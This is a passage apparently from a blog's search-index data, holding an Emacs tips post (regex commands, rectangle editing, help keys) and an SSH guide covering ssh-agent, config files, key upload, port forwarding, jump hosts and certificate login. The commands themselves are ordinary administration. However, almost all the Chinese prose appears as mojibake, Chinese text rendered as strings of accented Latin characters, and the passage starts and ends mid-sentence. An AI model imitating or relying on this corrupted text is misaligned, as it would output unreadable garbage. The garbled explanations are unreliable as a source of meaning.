å°†æ‰€æœ‰åŒ¹é…çš„æ–‡æœ¬ï¼Œå¯¼å‡ºåˆ° Occur buffer ä¸­ã€‚\nåœ¨è¾“å…¥æ­£åˆ™è¡¨è¾¾å¼æ—¶ï¼Œå¦‚æœéœ€è¦åŒ¹é…æ¢è¡Œç¬¦ï¼Œè¯·è¾“å…¥ C-j ã€‚\nM-x keep-lines ä»…ä¿ç•™åŒ¹é…çš„è¡Œ\nM-x flush-lines å‰”é™¤åŒ¹é…çš„è¡Œ\nC-u C-x = æ˜¾ç¤ºå…‰æ ‡æ‰€åœ¨å­—ç¬¦çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ­£åˆ™åˆ†ç»„ã€è¯­æ³•ç­‰ä¿¡æ¯ã€‚\nåœ¨å¤šä¸ªæ–‡ä»¶ä¸­æŸ¥æ‰¾ã€æ›¿æ¢ M-x find-name-dired: ä¼šæç¤ºä½ é€‰æ‹©ä¸€ä¸ªç›®å½•ï¼Œä»¥åŠä¸€ä¸ª filename wildcard ç”¨äºåŒ¹é…ä½ æƒ³è¦æŸ¥æ‰¾çš„æ‰€æœ‰æ–‡ä»¶ï¼Œä¾‹å¦‚ *.el ä¼šåŒ¹é…æ‰€æœ‰æ‰©å±•åä¸º .el çš„æ–‡ä»¶ï¼› æŒ‰Â tÂ é€‰ä¸­æ‰€æœ‰åŒ¹é…åˆ°çš„æ–‡ä»¶ï¼› æŒ‰Â QÂ æ‰§è¡Œ â€œQuery replace regexp in marked filesâ€ï¼Œå³æ­£åˆ™æŸ¥æ‰¾å’Œæ›¿æ¢ï¼› æ¥ä¸‹æ¥çš„æµç¨‹å’ŒÂ query-replace-regexpÂ ç±»ä¼¼ï¼Œè·Ÿç€æç¤ºèµ°å³å¯ï¼› æŒ‰Â C-x sÂ ä¿å­˜æ‰€æœ‰ä¿®æ”¹è¿‡çš„ buffersï¼ŒæŒ‰Â yÂ ä¿å­˜,Â nÂ è·³è¿‡, !Â ä¿å­˜æ‰€æœ‰æ–‡ä»¶ã€‚ æ­£åˆ™è¡¨è¾¾å¼è¯­æ³• å‚è€ƒï¼šhttps://www.emacswiki.org/emacs/RegularExpression\nEmacs çš„æ­£åˆ™è¡¨è¾¾å¼å’Œ Python çš„è§„åˆ™æœ‰äº›ç±»ä¼¼ï¼Œä½†è¿˜æ˜¯æœ‰ä¸å°‘å·®å¼‚ã€‚\nä¸€äº›å€¼å¾—æ³¨æ„ or æœ‰æ„æ€çš„ç¤ºä¾‹ï¼š\n\\` \\' åˆ†åˆ«è¡¨ç¤º buffer/string çš„å¼€å§‹å’Œç»“æŸ \\s- æˆ–è€… [[:space:]] è¡¨ç¤ºç©ºç™½å­—ç¬¦ \\w\\{20,\\} è¡¨ç¤ºé•¿åº¦å¤§äºç­‰äº20çš„å•è¯ [-+[:digit:]] è¡¨ç¤ºæ•°å­—æˆ–è€… â€œ-â€ æˆ–è€… â€œ+â€ \\w+er\\\u003e è¡¨ç¤º er ç»“å°¾çš„å•è¯ \\(19\\|20\\)[0-9]\\{2\\} åŒ¹é… 1900 ~ 2099 ä½¿ç”¨åˆ°æ­£åˆ™è¡¨è¾¾å¼çš„å‘½ä»¤åˆé›† 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 C-M-s incremental forward search matching regexp C-M-r incremental backward search matching regexp replace-regexp replace string matching regexp query-replace-regexp same, but query before each replacement align-regexp align, using strings matching regexp as delimiters highlight-regexp highlight strings matching regexp occur show lines containing a match multi-occur show lines in all buffers containing a match how-many count the number of strings matching regexp keep-lines delete all lines except those containing matches flush-lines delete lines containing matches grep call unix grep command and put result in a buffer lgrep user-friendly interface to the grep command rgrep recursive grep dired-do-copy-regexp copy files with names matching regexp dired-do-rename-regexp rename files matching regexp find-grep-dired display files containing matches for regexp with Dired æ‹¬å·ç›¸å…³ C-M-u backward-up-list, è·³åˆ°ä¸Šä¸€ä¸ªæ‹¬å·å¤„ C-M-d down-listï¼Œå‘å†…è·³ C-M-u C-M-SPC é€‰ä¸­æ•´ä¸ªæ‹¬å·åŒºåŸŸ C-M-n forward-listï¼Œè·³åˆ°ä¸‹ä¸€ä¸ªæ‹¬å·å¤„ C-M-p backward-listï¼Œè·³åˆ°ä¸Šä¸€ä¸ªæ‹¬å·å¤„ Org-mode C-c C-, s org-insert-structure-template å¿«æ·æ’å…¥ä»£ç å—\nC-c \u003c org-date-from-calendar æ’å…¥æˆ–æ›´æ–°æ—¥æœŸ\nå¸¸è§„ç¼–è¾‘åŠŸèƒ½ æ¢ä½æ“ä½œ Transpose Objects C-t transpose-chars\nM-t transpose-words\nC-x C-t transpose-lines\nType M-x transpose SPACE to see more transposing commands.\nC-x DEL backward-kill-sentence åˆ é™¤åˆ°è¡Œé¦–\nåˆ—ç¼–è¾‘ Rectangle C-x r r Copy rectangle to region. C-x r i Insert region. C-x r k Kill the text of the region-rectangle, saving its contents as the â€œlast killed rectangleâ€ (kill-rectangle). C-x r d Delete the text of the region-rectangle (delete-rectangle). C-x r y Yank the last killed rectangle with its upper left corner at point (yank-rectangle). C-x r o Insert blank space to fill the space of the region-rectangle (open-rectangle). This pushes the previous contents of the region-rectangle rightward. C-x r c Clear the region-rectangle by replacing all of its contents with spaces (clear-rectangle). M-x delete-whitespace-rectangle Delete whitespace in each of the lines on the specified rectangle, starting from the left edge column of the rectangle. C-x r t string \u003cRET\u003e Replace rectangle contents with string on each line (string-rectangle). M-x string-insert-rectangle \u003cRET\u003e string \u003cRET\u003e Insert string on each line of the rectangle. å…¶ä»– M-x untabify Convert all tabs in region to multiple spaces, preserving columns.\nC-x C-v Find alternate file, ä¹Ÿå¯ä»¥ç”¨æ¥ reload file.\nSearch C-s C-w search for the word after the current mark C-s C-y searches for the rest of the line after the current mark C-s C-M-y searches for the character after the mark\nM-% query-replace C-M-% query-replace-regexp\nregexp notes:\nspaces: â€œ\\s-â€ Jump C-SPC C-SPC Set the mark, pushing it onto the mark ring, without activating it.\nC-u C-SPC Move point to where the mark was, and restore the mark from the ring of former marks.\nM-e isearch-edit-string, edit the search string in the minibuffer when isearch is activated.\nM-. xref-find-definitions è·³åˆ°æ–¹æ³•ã€å˜é‡çš„å®šä¹‰å¤„\nM-, xref-go-back è·³å›å»\nM-? xref-find-references åˆ—å‡ºè¯¥ç¬¦å·çš„å¼•ç”¨å¤„\nC-c l org-store-link\nBookmark C-x r m - set a bookmark at the current location (e.g. in a file) C-x r b - jump to a bookmark C-x r l - list your bookmarks M-x bookmark-delete - delete a bookmark by name\nMacro C-x ( Start recording macro C-x ) End recording macro C-x e Run macro\nMode CC Mode C-c . c-set-style, switching CC Mode style\nfido-mode\nè¯¥æ¨¡å¼å¼€å¯æ—¶ï¼Œåœ¨æ‰§è¡Œ make-directory æ—¶ï¼Œè¦åˆ›å»ºçš„ç›®å½•å¾ˆå®¹æ˜“åŒ¹é…åˆ°æ–‡ä»¶åå¯¼è‡´æ— æ³•åˆ›å»ºï¼Œè¿™æ—¶å¯ä»¥è¾“å…¥æ–‡ä»¶åï¼Œå¹¶ç›´æ¥æŒ‰ä¸‹ M-j å³å¯ç«‹å³åˆ›å»ºè¯¥æ–‡ä»¶å¤¹ã€‚ hl-line-mode é«˜äº®å½“å‰è¡Œ\nç‰¹æ®Šå­—ç¬¦ C-x 8 RÂ è¾“å…¥ Â® C-x 8 oÂ è¾“å…¥ Â° C-x 8 C-hÂ è·å¾—ä¸€ä»½å®Œæ•´çš„åˆ—è¡¨ å¸®åŠ©æ–‡æ¡£ C-h fÂ æŸ¥çœ‹æŸä¸ªå‡½æ•°çš„æ–‡æ¡£ C-h vÂ æŸ¥çœ‹æŸä¸ªå˜é‡çš„æ–‡æ¡£ C-h aÂ ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥æŸ¥æ‰¾å‘½ä»¤ï¼ˆ**M-x apropos**å¯æŸ¥æ‰¾å‡½æ•°æˆ–å˜é‡ï¼‰ C-h kÂ æŸ¥çœ‹å¿«æ·é”®ç»‘å®šçš„å‘½ä»¤ C-h lÂ æ˜¾ç¤ºæœ€è¿‘çš„ 100 ä¸ªé”®å…¥åŠ¨ä½œ C-h mÂ æè¿°å½“å‰çš„ mode C-h iÂ æŸ¥çœ‹ info æ–‡æ¡£ C-h C-h è·å–å®Œæ•´åˆ—è¡¨ ","description":"","tags":["emacs","tools","editor"],"title":"Emacs Tips","uri":"/posts/emacs-tips/"},{"categories":null,"content":"ssh æ˜¯å¹³æ—¶ååˆ†å¸¸ç”¨çš„å·¥å…·ï¼Œè¿™é‡Œè®°å½•ä¸€äº›å¸¸è§ç”¨æ³•ã€‚\nä¸€äº›èŠ±æ ·ç©æ³• é€šè¿‡ ssh å…±äº« tmux session remote machine: tmux -S /tmp/shared-tmux-socket new-session local machine: ssh -t remote-machine tmux -S /tmp/shared-tmux-socket attach é€šè¿‡ä¸Šé¢ç®€å•ä¸¤æ­¥ï¼Œå°±å¯ä»¥é€šè¿‡ ssh è¿œç¨‹è¿œç¨‹å…±äº« tmux session äº†ã€‚\nè·Ÿæ™®é€šçš„ ssh ç™»å½•ä¸Šå»å† tmux è¿˜æ˜¯æœ‰ä¸€å®šåŒºåˆ«çš„ï¼Œå…¶ä¸­æœ€å¤§çš„åŒºåˆ«ï¼Œæ˜¯æœ¬åœ°ã€è¿œç¨‹èƒ½åŒæ—¶çœ‹åˆ°è¿™ä¸ª sessionï¼ŒåŒ…æ‹¬ä½ åœ¨ tmux é‡Œé¢æ•²çš„æ¯ä¸ªå‘½ä»¤ï¼Œä»¥åŠç»ˆç«¯çš„æ‰€æœ‰è¾“å‡ºï¼Œéƒ½æ˜¯å®æ—¶åŒæ­¥çš„ï¼Œæœ‰ç‚¹ã€Œç»ˆç«¯ç‰ˆæœ¬çš„æ¡Œé¢å…±äº«ã€çš„æ„æ€ã€‚æ„Ÿè§‰ç”¨æ¥åšè¿œç¨‹æ•™å­¦æŒºæ–¹ä¾¿çš„ã€‚\nssh å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ é€šå¸¸æˆ‘ä»¬åœ¨è¿æ¥ä¸åŒçš„æœåŠ¡å™¨æ—¶ï¼Œéœ€è¦ä½¿ç”¨ä¸åŒçš„å‚æ•°ã€‚ä¾‹å¦‚æœ€å¸¸è§çš„ç”¨æˆ·åä¸ åŒã€ç«¯å£ä¸åŒã€ç§é’¥ä¸åŒç­‰ã€‚è¿™æ—¶å¯ä»¥é…ç½® ~/.ssh/config æ–‡ä»¶ï¼ŒæŒ‰ç…§ä¸åŒ çš„æœåŠ¡å™¨ï¼Œåˆ—å‡ºå„è‡ªçš„å‚æ•°ï¼Œé¿å…æ¯æ¬¡ç™»é™†æ—¶éƒ½éœ€è¦é‡å¤è¾“å…¥è¿™äº›å‚æ•°ã€‚\nå¸¸ç”¨é…ç½®ç¤ºä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # ~/.ssh/config Host * Port 1234 # æ˜¯å¦å‹ç¼© Compression yes # åœ¨ç»™å®šç§’æ•°å†…ï¼Œæ²¡æ”¶åˆ°æœåŠ¡å™¨æ•°æ®ï¼Œåˆ™å‘æœåŠ¡å™¨è¯·æ±‚ä¸€ä¸ªå›åŒ…ï¼Œå¯ç”¨äºè¿æ¥ä¿æ´» ServerAliveInterval 60 # ç¦æ­¢å‘é€ TCP keepalive æ¶ˆæ¯ï¼Œé¿å…ä¸´æ—¶ç½‘ç»œä¸­æ–­å¼•èµ·è¿æ¥ä¸­æ–­ TCPKeepAlive no Host svr HostName svr.example.com User tom Port 2222 IdentityFile ~/.ssh/id_rsa-svr # æŒ‡å®šæœ¬æœº IP åœ°å€ BindAddress 192.168.10.235 æ›´å¤šé…ç½®å¯å‚è€ƒ man ssh_config ã€‚\nTips:\nå¦‚æœè¦ç§»é™¤ä¸€ä¸ªè¿‡æœŸäº†çš„æœåŠ¡å™¨æŒ‡çº¹ï¼ˆä¾‹å¦‚é‡åˆ° WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! çš„è­¦å‘Šï¼‰ï¼Œå¯ä»¥ä½¿ç”¨è¯¥å‘½ä»¤ï¼š ssh-keygen -R github.com ssh-agent å¦‚æœç§é’¥è®¾ç½®äº†å¯†ç ï¼Œæ¯æ¬¡ç™»é™†éƒ½éœ€è¦è¾“å…¥å¯†ç ï¼Œæ¯”è¾ƒéº»çƒ¦ã€‚ ssh-agent å¯ ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ssh-agent å…è®¸åœ¨æ•´ä¸ª session ä¸­ï¼Œåªè¾“å…¥ä¸€æ¬¡å¯†ç ã€‚\nå»ºç«‹ session 1 2 3 4 5 6 7 8 # å¼€æ–°çš„ shell å¹¶å¯ç”¨ ssh-agent, bash å¯ä»¥æ¢æˆ zsh ssh-agent bash # åœ¨å½“å‰ shell ä¸‹å¯ç”¨ ssh-agent eval `ssh-agent` # é€€å‡º ssh-agent ssh-agent -k æ·»åŠ ç§é’¥ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # æ·»åŠ é»˜è®¤ç§é’¥ï¼ŒæŒ‰ç…§æç¤ºè¾“å…¥å¯†ç ï¼ˆpassphraseï¼‰ ssh-add # æ·»åŠ æŒ‡å®šçš„ç§é’¥ ssh-add ~/.ssh/id_rsa-svr # åˆ—å‡ºæ‰€æœ‰å·²æ·»åŠ çš„ç§é’¥ ssh-add -l # ä»å†…å­˜ä¸­ç§»é™¤æŒ‡å®šçš„ç§é’¥ ssh-add -d ~/.ssh/id_rsa-svr # ä»å†…å­˜ä¸­åˆ é™¤æ‰€æœ‰å·²æ·»åŠ çš„ç§é’¥ ssh-add -D é€šè¿‡ç§é’¥å¯¼å‡ºå…¬é’¥ æœ‰æ—¶å€™æˆ‘ä»¬åªæœ‰ç§é’¥æ–‡ä»¶ï¼Œè¿™æ—¶å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤å¯¼å‡ºå…¶å¯¹åº”çš„å…¬é’¥ã€‚\n1 ssh-keygen -y -f ~/.ssh/id_rsa eval ssh-agent æˆ– eval â€œ$(ssh-agent)â€ çš„ä¸€ç‚¹è§£é‡Š åœ¨è¿è¡Œ ssh-agent çš„æ—¶å€™ï¼Œä¸€èˆ¬ä½¿ç”¨ eval ssh-agentæˆ–eval â€œ$(ssh-agent)\"`` ï¼Œè€Œä¸æ˜¯ç›´æ¥è¿è¡Œ ssh-agentï¼Œä»€ä¹ˆåŸå› å‘¢ï¼Ÿ\nå½“ä½ ç›´æ¥è¿è¡Œ ssh-agent æ—¶ï¼Œå®ƒä¼šå¯åŠ¨ä¸€ä¸ªæ–°çš„ä»£ç†è¿›ç¨‹å¹¶è¾“å‡ºä¸€äº›ç¯å¢ƒå˜é‡ï¼ˆæ‰“å°åˆ°æ ‡å‡†è¾“å‡ºï¼‰ï¼Œä¾‹å¦‚ SSH_AGENT_PID å’Œ SSH_AUTH_SOCKã€‚è¿™äº›ç¯å¢ƒå˜é‡ç”¨äºå‘Šè¯‰ SSH å®¢æˆ·ç«¯å¦‚ä½•ä¸ä»£ç†è¿›ç¨‹è¿›è¡Œé€šä¿¡ã€‚ç„¶è€Œï¼Œç›´æ¥è¿è¡Œ ssh-agent å¹¶ä¸ä¼šè®¾ç½®è¿™äº›ç¯å¢ƒå˜é‡ï¼Œå®ƒä»¬åªä¼šè¢«è¾“å‡ºåˆ°ç»ˆç«¯ã€‚\n1 2 3 4 $ ssh-agent SSH_AUTH_SOCK=/tmp/ssh-xxxxxxxxxx/agent.12345; export SSH_AUTH_SOCK; SSH_AGENT_PID=12345; export SSH_AGENT_PID; echo Agent pid 12345; ç›¸åï¼Œå½“ä½ ä½¿ç”¨ eval \"$(ssh-agent)\" æ—¶ï¼Œeval å‘½ä»¤ä¼šè§£æå¹¶æ‰§è¡Œ ssh-agent è¾“å‡ºçš„ç¯å¢ƒå˜é‡è®¾ç½®å‘½ä»¤ã€‚è¿™æ ·ï¼Œç¯å¢ƒå˜é‡å°±ä¼šè¢«æ­£ç¡®è®¾ç½®ï¼ŒSSH å®¢æˆ·ç«¯å°±èƒ½ä¸ä»£ç†è¿›ç¨‹è¿›è¡Œé€šä¿¡ã€‚\n1 2 $ eval \"$(ssh-agent)\" Agent pid 12345 æ€»ä¹‹ï¼Œä½¿ç”¨ eval \"$(ssh-agent)\" èƒ½ç¡®ä¿ SSH å®¢æˆ·ç«¯èƒ½å¤Ÿæ­£ç¡®è¯†åˆ«å¹¶ä½¿ç”¨ä»£ç†è¿›ç¨‹ï¼Œè€Œç›´æ¥è¿è¡Œ ssh-agent åªä¼šè¾“å‡ºç¯å¢ƒå˜é‡ï¼Œè€Œä¸ä¼šå°†å®ƒä»¬è®¾ç½®åˆ°å½“å‰ shell ç¯å¢ƒä¸­ã€‚ä¸ºäº†ç¡®ä¿ ssh-agent èƒ½æ­£å¸¸å·¥ä½œï¼Œå»ºè®®ä½¿ç”¨ eval \"$(ssh-agent)\" å‘½ä»¤å¯åŠ¨å®ƒã€‚\nå¦‚ä½•è‡ªåŠ¨è¿è¡Œ ssh-agent å¯ä»¥å°† eval \"$(ssh-agent)\" æ·»åŠ åˆ° ~/.bash_profile æˆ– ~/.profile æ–‡ä»¶ä¸­ï¼ˆå–å†³äºä½ çš„ç³»ç»Ÿé…ç½®ï¼‰ã€‚è¿™äº›æ–‡ä»¶ä»…åœ¨ç™»å½•æ—¶æ‰§è¡Œä¸€æ¬¡ï¼Œè¿™æ ·å°±å¯ä»¥é¿å…é‡å¤å¯åŠ¨ ssh-agentã€‚\næ³¨æ„ï¼Œè¯·ä¸è¦åœ¨ ~/.bashrc æ–‡ä»¶ä¸­æ·»åŠ  eval \"$(ssh-agent)\" åŸå› å¦‚ä¸‹ï¼š\nç„¶åï¼Œä½ éœ€è¦ç¡®ä¿ ~/.bashrc æˆ–å…¶ä»–ä¼šè¯åˆå§‹åŒ–è„šæœ¬ä¸­åŒ…å«ä»¥ä¸‹ä»£ç ï¼Œä»¥ä¾¿åœ¨æ–°çš„ shell ä¼šè¯ä¸­ç»§æ‰¿çˆ¶ä¼šè¯çš„ç¯å¢ƒå˜é‡ï¼š\n1 2 3 4 5 6 7 if [ -n \"$SSH_AUTH_SOCK\" ]; then export SSH_AUTH_SOCK fi if [ -n \"$SSH_AGENT_PID\" ]; then export SSH_AGENT_PID fi è¿™æ ·ï¼Œåœ¨ç™»å½•æ—¶å¯åŠ¨çš„ ssh-agent å®ä¾‹å°†åœ¨æ‰€æœ‰æ–°çš„ shell ä¼šè¯ä¸­å¯ç”¨ï¼Œè€Œä¸ä¼šå¯åŠ¨é¢å¤–çš„ä»£ç†è¿›ç¨‹ã€‚\nä¸Šä¼ å…¬é’¥ ä¸Šä¼ å…¬é’¥æœ‰ä¸¤ç§æ–¹å¼ï¼š\nåˆ©ç”¨ ssh-copy-id å‘½ä»¤\n1 2 # -i id_rsa å‚æ•°å¯ä»¥çœç•¥ ssh-copy-id -i id_rsa user@svr åˆ©ç”¨ ssh æ‰§è¡Œè¿œç¨‹å‘½ä»¤ä¸Šä¼ \n1 cat ~/.ssh/id_rsa.pub | ssh user@svr \"mkdir -p ~/.ssh \u0026\u0026 cat \u003e\u003e ~/.ssh/authorized_keys\" å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥ç™»é™†æœåŠ¡å™¨ï¼Œç„¶åå°†å…¬é’¥æ‰‹åŠ¨ç²˜è´´åˆ°æœåŠ¡å™¨ç«¯ã€‚\nç«¯å£è½¬å‘ åŠ¨æ€ç«¯å£è½¬å‘ 1 2 3 # -D: æŒ‡å®šæœ¬åœ°è¦è½¬å‘çš„ç«¯å£ï¼Œä½¿ç”¨ SOCSOCKS4/SOCKS5 åè®® # -N: è¡¨ç¤ºä¸æ‰§è¡Œè¿œç¨‹å‘½ä»¤ï¼Œä»…ç”¨äºç«¯å£è½¬å‘ ssh -D 1080 svr -N åˆ©ç”¨ä¸Šè¿°å»ºç«‹çš„ SOCSOCKS4/SOCKS5 æœåŠ¡æ¥è·å–æ•°æ®ï¼š\n1 curl -x socks5://localhost:1080 \u003chttps://www.google.com/\u003e æœ¬åœ°ç«¯å£è½¬å‘ è½¬å‘åˆ°å…¶ä»–æœºå™¨ï¼š\n1 2 3 4 5 6 7 # å»ºç«‹ä»æœ¬æœº 11111 ç«¯å£åˆ° www.baidu.com:80 çš„åŠ å¯†éš§é“ï¼Œé€šè¿‡ svr ssh æœåŠ¡å™¨åšä¸­è½¬ # -f: åå°è¿è¡Œ ssh -NfL 11111:www.baidu.com:80 svr # è®¿é—®æœ¬æœºçš„ 11111 ç«¯å£ï¼Œç›¸å½“äºé€šè¿‡ svr è®¿é—® www.baidu.com:80 # è¿™é‡Œéœ€è¦è®¾ç½® host header, å¦åˆ™ç™¾åº¦ä¼šæ‹’ç»è®¿é—® curl --header 'Host: www.baidu.com' localhost:11111 è½¬å‘åˆ° ssh æœåŠ¡å™¨æœ¬æœºçš„å…¶ä»–ç«¯å£ï¼š\n1 2 3 4 5 # svr çš„ 8118 ç«¯å£ä¸Šå¯åŠ¨ä¸€ä¸ª http ä»£ç†æœåŠ¡å™¨ï¼Œä¾‹å¦‚ privoxy/squid/varnish ç­‰ ssh -NfL 11111:localhost:8118 svr # æœ¬æœºçš„ 11111 ç«¯å£ï¼Œå¯ä»¥ä½œä¸ºä»£ç†ç«¯å£æ¥ä½¿ç”¨ curl -x http://localhost:11111 www.google.com è¿œç¨‹ç«¯å£è½¬å‘ è¿œç¨‹ç«¯å£è½¬å‘ å’Œ æœ¬åœ°ç«¯å£è½¬å‘ åˆšå¥½ç›¸åï¼Œæœ¬åœ°è½¬å‘æ˜¯ æœ¬åœ°è®¡ç®—æœºé€šè¿‡ åŠ å¯†éš§é“è®¿é—®è¿œç¨‹ä¸»æœº, è€Œè¿œç¨‹è½¬å‘æ˜¯ è¿œç¨‹ä¸»æœºé€šè¿‡åŠ å¯†éš§é“è®¿é—®æœ¬æœºè®¡ç®— æœº ã€‚\nä¸‹é¢é€šè¿‡ä¸¤ä¸ªæ¡ˆä¾‹æ¥å…·ä½“ä»‹ç»å…¶ç”¨æ³•ã€‚\næ¡ˆä¾‹ä¸€ï¼šå°†å†…ç½‘çš„æŸä¸ªæœåŠ¡æ˜ å°„åˆ°å¤–ç½‘æœåŠ¡å™¨ä¸Š 1 2 3 4 5 6 # å°† my.public.svr:80 æ˜ å°„åˆ° 192.168.1.10:8080 # å¤–ç½‘è®¿é—® my.public.svr:80 å³å¯è®¿é—®åˆ°å†…ç½‘çš„ 192.168.1.10:8080 ssh -R 80:192.168.1.10:8080 my.public.svr # å°† my.public.svr:8080 æ˜ å°„åˆ°æœ¬æœºçš„ 80 ç«¯å£ ssh -R 8080:localhost:80 my.public.svr æ¡ˆä¾‹äºŒï¼šå°†å†…ç½‘æœåŠ¡å™¨é€šè¿‡ ssh è·³æ¿æœºæ˜ å°„åˆ°æœ¬æœº 1 2 3 # åœ¨ ssh è·³æ¿æœºä¸Šæ‰§è¡Œï¼Œå‡è®¾ 192.168.1.10 ä¸ºæœ¬æœº IP åœ°å€ï¼ˆå‰ææ˜¯æœ¬æœºè£…æœ‰ sshd æœåŠ¡ï¼‰ # ä¹‹ååœ¨æœ¬æœºæ‰§è¡Œ ssh -p 2222 localhost å³å¯ç™»é™† my.private.svr ssh -R 2222:my.private.svr:22 192.168.1.10 åˆ©ç”¨ç«¯å£è½¬å‘åš ssh äºŒæ¬¡è·³è½¬ å»ºç«‹ localhost åˆ° host1 çš„éš§é“\n1 ssh -L 9999:host2:1234 -N host1 æ³¨æ„ï¼Œè¿™é‡Œ host1 åˆ° host2 çš„è¿æ¥æ˜¯éåŠ å¯†çš„ã€‚\nå»ºç«‹ localhost åˆ° host1 çš„éš§é“ï¼ŒåŒæ—¶å»ºç«‹ host1 åˆ° host2 çš„éš§é“\n1 ssh -L 9999:localhost:9999 host1 ssh -L 9999:localhost:1234 -N host2 host1 åˆ° host2 çš„è¿æ¥ä¹Ÿæ˜¯åŠ å¯†çš„ï¼Œä½†æ˜¯ host1:9999 åˆ° host2:1234 çš„éš§ é“å¯ä»¥è¢« host1 ä¸Šçš„ä»»æ„ç”¨æˆ·ä½¿ç”¨ã€‚\nå»ºç«‹ localhost åˆ° host1 çš„éš§é“ï¼Œå†å»ºç«‹ localhost åˆ° host2 çš„éš§é“\n1 2 3 4 # è½¬å‘æœ¬æœº 9998 ç«¯å£åˆ° host2:22 ssh -L 9998:host2:22 -N host1 # é€šè¿‡ 9998 ç«¯å£è¿æ¥ host2 çš„ sshd, å¹¶è½¬å‘æœ¬æœºç«¯å£ 9999 åˆ° host2:1234 ssh -L 9999:localhost:1234 -N -p 9998 localhost å¦‚æœ 1234 æœåŠ¡åªèƒ½é€šè¿‡ host2 æœ¬æœºè®¿é—®ï¼Œåˆ™å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ¥é—´æ¥è®¿é—® è¯¥æœåŠ¡ã€‚\nå‚è€ƒï¼š\nAn SSH tunnel via multiple hops - Super User Emacs Tramp ssh double hop - Stack Overflow åˆ©ç”¨ä»£ç†å‘½ä»¤åš ssh äºŒæ¬¡è·³è½¬ - double hop 1 2 3 4 5 6 7 8 9 10 Host endpoint2 User myusername HostName mysite.com Port 3000 ProxyCommand ssh endpoint1 nc -w300 %h %p Host endpoint1 User somename HostName otherdomainorip.com Port 6893 æ‰§è¡Œ ssh endpoint2 ä¼šè‡ªåŠ¨é€šè¿‡è·³æ¿æœº endpoint1 æ¥ç™»é™† endpoint2 ã€‚\nå¦è§ ssh å¸¸è§ç”¨æ³•ä»‹ç» ã€‚\nssh è¯ä¹¦ç™»é™† è¯ä¹¦ç­¾å‘ è¦ä½¿ç”¨è¯ä¹¦ç™»é™†ï¼Œé¦–å…ˆéœ€è¦ä¸ºæœåŠ¡å™¨ã€ç”¨æˆ·ç«¯åˆ†åˆ«ç­¾å‘è¯ä¹¦ã€‚\nCA å¯†é’¥ï¼š\nCA è¦ç­¾å‘è¯ä¹¦ï¼Œé¦–å…ˆéœ€è¦ä¸€å¯¹å¯†é’¥ï¼Œå¯ä»¥é€šè¿‡ ssh-keygen æ¥ç”Ÿæˆå¯†é’¥å¯¹ è€ƒè™‘åˆ°å®‰å…¨æ€§å’Œçµæ´»æ€§ï¼Œåœ¨ç­¾å‘æœåŠ¡å™¨è¯ä¹¦å’Œç”¨æˆ·è¯ä¹¦æ—¶ï¼Œå¯ä»¥åˆ†åˆ«ä½¿ç”¨ä¸¤å¯¹ ä¸åŒçš„å¯†é’¥ï¼Œè¿™é‡Œåˆ†åˆ«ç§°ä¸º ca-server å¯†é’¥å¯¹å’Œ ca-user å¯†é’¥å¯¹ ç­¾å‘è¯ä¹¦ï¼š\nç­¾å‘ ssh æœåŠ¡å™¨è¯ä¹¦ï¼š\nä½¿ç”¨ ca-server ç§é’¥ + æœåŠ¡å™¨å…¬é’¥ + å…¶ä»–ä¿¡æ¯ï¼ˆåŸŸåï¼Œidentity, æœ‰æ•ˆæœŸ ç­‰ï¼‰ï¼Œç”ŸæˆæœåŠ¡å™¨è¯ä¹¦ã€‚\nç­¾å‘ ssh ç”¨æˆ·è¯ä¹¦ï¼š\nä½¿ç”¨ ca-user ç§é’¥ + ç”¨æˆ·å…¬é’¥ + å…¶ä»–ä¿¡æ¯ï¼ˆidentity, æœ‰æ•ˆæœŸç­‰ï¼‰ï¼Œç”Ÿæˆ ç”¨æˆ·è¯ä¹¦ã€‚\nè¯ä¹¦å¯ä»¥é€šè¿‡ identity æ¥æ’¤é”€ï¼ˆrevokeï¼‰ï¼Œæˆ–è€…é€šè¿‡æŒ‡å®š public key æ¥ revoke\nè¯ä¹¦é…ç½® é…ç½®æœåŠ¡å™¨è¯ä¹¦ï¼šé€šè¿‡ sshd_config çš„ HostCertificate å­—æ®µæ¥è¿›è¡Œé… ç½®ï¼›\né…ç½®ç”¨æˆ·è¯ä¹¦ï¼šæ‹·è´åˆ°ç”¨æˆ·çš„ ~/.ssh/ ç›®å½•å³å¯ï¼›\næœåŠ¡å™¨ä¿¡ä»»ç”¨æˆ·è¯ä¹¦ï¼š\né€šè¿‡ sshd_config çš„ TrustedUserCAKeys å­—æ®µï¼Œé…ç½®æœåŠ¡å™¨ä¿¡ä»»çš„ ca-user å…¬é’¥ã€‚å³æœåŠ¡å™¨ä¼šä¿¡ä»»ç”± TrustedUserCAKeys æŒ‡å®šçš„æ–‡ä»¶é‡Œçš„å…¬ é’¥æ‰€ç­¾å‘çš„ç”¨æˆ·è¯ä¹¦ã€‚\nå®¢æˆ·ç«¯ä¿¡ç”¨æœåŠ¡å™¨è¯ä¹¦ï¼š\nåœ¨ ~/.ssh/known_hosts ä¸­å¢åŠ ä¸€è¡Œï¼š\n1 @cert-authority * ssh-rsa \u003cca-server-public-key\u003e æ›¿æ¢æˆ ca-server å…¬é’¥å³å¯ã€‚\nssh è¯ä¹¦ç™»é™†æµç¨‹ å¤§è‡´çš„ ssh è¯ä¹¦ç™»é™†æµç¨‹å¦‚ä¸‹æ‰€ç¤ºï¼š\nç”¨æˆ·ç™»é™† ssh æœåŠ¡å™¨ï¼Œssh å®¢æˆ·ç«¯è‡ªåŠ¨å°†ç”¨æˆ·è¯ä¹¦å‘ç»™æœåŠ¡å™¨ æœåŠ¡å™¨æ ¡éªŒç”¨æˆ·è¯ä¹¦æ˜¯å¦å¯ä¿¡å’Œæœ‰æ•ˆï¼ŒéªŒè¯é€šè¿‡åï¼Œå°†æœåŠ¡å™¨è¯ä¹¦å‘ç»™ç”¨æˆ·ä¾§ ç”¨æˆ·ä¾§æ 